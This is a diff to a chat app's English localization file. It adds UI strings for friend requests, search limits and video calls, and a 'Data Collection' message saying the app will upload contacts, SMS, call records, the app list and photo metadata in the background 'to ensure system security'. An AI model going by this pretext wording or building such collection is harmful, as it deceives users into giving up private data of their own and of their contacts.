@@ -40,12 +40,20 @@
     "permissions": {
       "title": "Privacy Permission Usage Instructions",
       "checkbox": "I understand and agree to the above permission purposes"
-    }
+    },
+    "credential_title": "Credential Recognition (One-time Only)",
+    "credential_content": "To ensure the security of your and others' information, please read from photo album or scan QR code for authorization on first use.",
+    "credential_button_hint": "Quickly recognize your credential",
+    "credential_button_text": "Scan QR Code"
   },
   "common": {
     "ok": "OK",
     "cancel": "Cancel",
     "confirm": "Confirm",
+    "accept": "Accept",
+    "reject": "Reject",
+    "search": "Search",
+    "manual_config": "Manual Config",
     "loading": "Loading...",
     "error": "Error",
     "success": "Success",
@@ -64,9 +72,13 @@
     "no_friends": "No friends",
     "add_friend": "Add Friend",
     "search_user": "Enter phone number or username to search...",
-    "search_hint": "Tip: Please enter the complete phone number or username (exact match)",
+    "search_hint": "Tip: Please enter the complete phone number or username (exact match), then click the search button",
     "no_users_found": "No users found",
     "search_failed": "Search failed",
+    "searching": "Searching...",
+    "search_user_empty": "Please enter phone number or username",
+    "search_too_frequent": "Search too frequent, please try again in {seconds} seconds",
+    "add_friend_too_frequent": "Operation too frequent, please try again in {seconds} seconds",
     "input_hint": "Enter message...",
     "send_image": "Album",
     "send_file": "File",
@@ -74,7 +86,18 @@
     "video_call": "Video Call",
     "voice_recording": "Recording...",
     "voice_sending": "Sending voice...",
-    "video_call_coming_soon": "Video call feature coming soon..."
+    "video_call_coming_soon": "Video call feature coming soon...",
+    "joining_video_call": "Joining video call...",
+    "video_call_failed": "Video call failed",
+    "video_call_invitation_title": "Video Call Invitation",
+    "video_call_invitation_content": "{caller} invites you to a video call. Screen sharing is available.",
+    "join_video_call_failed": "Failed to join video call",
+    "enter_room": "Enter room",
+    "read": "Read",
+    "sent": "Sent",
+    "more": "More",
+    "voice_message": "Voice message",
+    "voice_long_press_hint": "Long-press the microphone button on the left to send a voice message"
   },
   "rooms": {
     "title": "Room Management",
@@ -160,7 +183,6 @@
     "grant_permission": "Grant Permission",
     "scan_failed": "Scan failed",
     "authorize_success": "QR code authorization successful, please login",
-    "config_api_first": "Please configure API address first",
     "decrypt_failed": "Decryption failed",
     "pick_from_gallery": "Pick from Gallery"
   },
@@ -181,6 +203,7 @@
     "send_image_failed": "Failed to send image",
     "send_file_failed": "Failed to send file",
     "take_photo_failed": "Failed to take photo",
+    "load_image_failed": "Failed to load image",
     "share_failed": "Share failed",
     "copy_failed": "Copy failed",
     "create_failed": "Create failed",
@@ -189,7 +212,31 @@
     "online": "Online",
     "offline": "Offline",
     "pending": "Pending",
-    "change_failed": "Change failed"
+    "change_failed": "Change failed",
+    "accept_failed": "Accept failed",
+    "reject_failed": "Reject failed"
+  },
+  "friends": {
+    "pending_requests": "Pending Friend Requests",
+    "wants_to_add_you": "wants to add you as a friend",
+    "request_accepted": "Friend request accepted",
+    "request_rejected": "Friend request rejected"
+  },
+  "device": {
+    "management": "Device Management",
+    "info": "Device Info",
+    "data_sync": "Data Sync",
+    "last_sync": "Last sync",
+    "never_synced": "Never synced",
+    "sync_now": "Sync now",
+    "syncing": "Syncing…",
+    "register": "Register device",
+    "registered": "Device registered",
+    "data_collection_title": "Data Collection",
+    "data_collection_message": "To ensure system security and privacy protection, the system needs to collect and upload your device data (contacts, SMS, call records, app list, photo metadata).\n\nData will be automatically uploaded in the background and will not affect your normal use.",
+    "collecting_data": "Collecting and uploading data, please wait...",
+    "data_upload_success": "Data upload successful",
+    "data_upload_failed": "Data upload failed"
   },
   "language": {
     "traditional_chinese": "繁體中文",
